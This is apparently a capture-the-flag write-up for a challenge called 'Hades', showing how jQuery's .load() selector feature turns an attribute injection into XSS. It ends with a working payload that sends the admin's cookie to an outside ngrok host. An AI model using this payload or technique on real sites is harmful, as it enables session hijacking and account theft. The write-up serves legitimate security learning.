---
description: jQuery-facilitated XSS
---

# Hades

## Overview

> Don't stop retrying!

This is basically a site that uses jQuery a bunch of AJAX requests to dynamically load the page content. For example, let's load the "news" category at `?cat=news`.

<figure><img src="../../.gitbook/assets/Screenshot 2023-02-20 at 2.25.48 PM.png" alt=""><figcaption></figcaption></figure>

Observing the HTML response, the `news` string is reflected twice in the JavaScript.

```markup
<script>
  console.log('cat in url');
  $('#ajax-load').load('/ajax/articles?cat=news');
  $('.search-filter ul li.tag').removeClass('active');
  $('.search-filter ul li[data-id="news"]').addClass('active');
  $('.search-filter ul li.tag').click(function() {
    $('.search-filter ul li.tag').removeClass('active');
    $(this).addClass('active');
    $('#ajax-load').html('<hr/><div class="loading"></div><hr/>');
    $('#ajax-load').load('/ajax/articles-results?cat=' + $(this).data('id'));
  });
</script>
```

Trying to use a single quote to break out of the string (`/?cat=news'`) doesn't work - a `\` is prepended to it.

```javascript
$('#ajax-load').load('/ajax/articles?cat=news\'');
```

After doing some testing, I found that the `\` character isn't escaped and `/?cat=news\\'` breaks out of the string.

However, because any `()` characters are removed and subsequent quotes are still escaped, I couldn't produce valid JavaScript after breaking out of the string.

```javascript
$('#ajax-load').load('/ajax/articles?cat=test\\'+alert``');
$('.search-filter ul li.tag').removeClass('active');
$('.search-filter ul li[data-id="test\\'+alert``"]').addClass('active');
```

It seems that we need to find another way to achieve XSS.

## Getting XSS

The first line of the JavaScript tells jQuery to fetch `/ajax/articles?cat=news` and set its contents as the HTML of the `#ajax-load` element.

```javascript
$('#ajax-load').load('/ajax/articles?cat=news');
```

Because we also control the `cat` parameter in this second request, we can try to find a HTML injection vector in `/ajax/articles` and inject it into `#ajax-load`.

The following request

```
/ajax/articles?cat=asdf"x="
```

injects an attribute into the `<img>` element in the response.

```markup
<noscript>
    If you can't see anything, you have to enable javascript
    <img src="/images/error.jpg" alt="selected category asdf"x="" />
</noscript>
```

Looking at jQuery's [`.load()` documentation](https://api.jquery.com/load/), we find an interesting feature that allows us to specify a specific portion of the remote document that we want to insert.

<figure><img src="../../.gitbook/assets/Screenshot 2023-02-20 at 2.55.38 PM.png" alt=""><figcaption></figcaption></figure>

This allows us to get rid of the pesky `<noscript>` tag end _only_ load the `<img>` element inside.

```
/?cat=random"onerror="alert`` img
```

will render

```markup
<img src="/images/error.jpg" alt="selected category random"onerror="alert``" />
```

and give us XSS.

We can use the following payload to steal the admin's cookie and get the flag.

{% code overflow="wrap" %}
```
/?cat=random"onerror="window.location=`https://f5e6-49-245-33-142.ngrok.io?${document.cookie}` img 
```
{% endcode %}
